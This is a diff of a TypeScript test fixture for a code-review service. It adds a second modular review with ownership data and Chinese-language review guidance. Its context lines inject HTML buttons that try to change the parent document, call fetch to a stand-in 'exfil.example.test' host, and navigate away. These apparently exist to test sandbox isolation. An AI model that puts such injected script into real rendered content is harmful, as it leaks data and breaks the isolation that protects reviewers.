@@ -13,6 +13,92 @@ writeFileSync(
 const { review, explanation } = await seed(f.service);
 explanation.html += `<button id="test-sandbox" onclick="try{parent.document.body.dataset.compromised='yes';document.getElementById('isolation').textContent='broken'}catch(e){document.getElementById('isolation').textContent='opaque origin'}fetch('https://exfil.example.test/leak').catch(()=>{})">Check isolation</button><p id="isolation"></p><button id="test-navigation" onclick="location.href='https://exfil.example.test/navigation'">Attempt external navigation</button>`;
 f.service.store.put("explanation", explanation);
+// A separate modular review preserves the legacy fixture and its acceptance cases.
+const previousSnapshot = f.service.current;
+const moduleTarget = {
+  ...previousSnapshot.target,
+  repo: "sample/modules",
+  number: 43,
+  url: "https://code.example.test/sample/modules/merge_requests/43",
+};
+const moduleVersion = {
+  ...structuredClone(previousSnapshot),
+  id: "module-version",
+  target: moduleTarget,
+  title: "Review by module",
+  files: [
+    ...previousSnapshot.files,
+    {
+      ...previousSnapshot.files[0],
+      path: "shared/contract.ts",
+      oldPath: "shared/contract.ts",
+    },
+  ],
+};
+f.service.current = moduleVersion;
+const moduleReview = await f.service.import(moduleTarget.url);
+const moduleReference = await f.service.createReference(
+  moduleReview.id,
+  moduleVersion.id,
+  "src/queue.ts",
+  "new",
+  2,
+  2,
+);
+const moduleGroups = structuredClone(explanation.guide!.groups);
+moduleGroups[0].responsibility = "处理任务取消与资源释放";
+moduleGroups[0].reviewFocus = ["核对取消后是否释放资源"];
+moduleGroups[0].context = [
+  {
+    group: 2,
+    reason: "资源释放依赖共享接口的新回调约定",
+    referenceIds: [moduleReference.id],
+  },
+];
+moduleGroups[1].responsibility = "规定共享接口的回调约定";
+moduleGroups[1].reviewFocus = ["核对调用方是否遵守新约定"];
+moduleGroups[1].context = [];
+moduleGroups[1].title = "共享接口";
+moduleGroups[1].points[0].title = "共享接口约定";
+moduleGroups[1].points[0].files = ["shared/contract.ts"];
+for (const g of moduleGroups)
+  for (const p of g.points) p.referenceIds = [moduleReference.id];
+f.service.store.put("explanation", {
+  ...explanation,
+  id: "module-explanation",
+  reviewId: moduleReview.id,
+  versionId: moduleVersion.id,
+  html: "<h1>Module overview</h1>",
+  references: [moduleReference],
+  guide: { groups: moduleGroups },
+  ownership: {
+    versionId: moduleVersion.id,
+    provider: "codebase",
+    status: "complete",
+    capturedAt: "2026-01-01T00:00:00Z",
+    rules: [],
+    warnings: [],
+    files: [
+      {
+        path: "src/queue.ts",
+        side: "new",
+        owners: ["runtime"],
+        ruleIds: [],
+        status: "resolved",
+      },
+      {
+        path: "shared/contract.ts",
+        side: "new",
+        owners: ["contracts"],
+        ruleIds: [],
+        status: "resolved",
+      },
+    ],
+  },
+});
+moduleReview.explanationId = "module-explanation";
+f.service.store.put("review", moduleReview);
+f.service.current = previousSnapshot;
 f.service.store.put("run", {
   id: "private-question",
   reviewId: review.id,
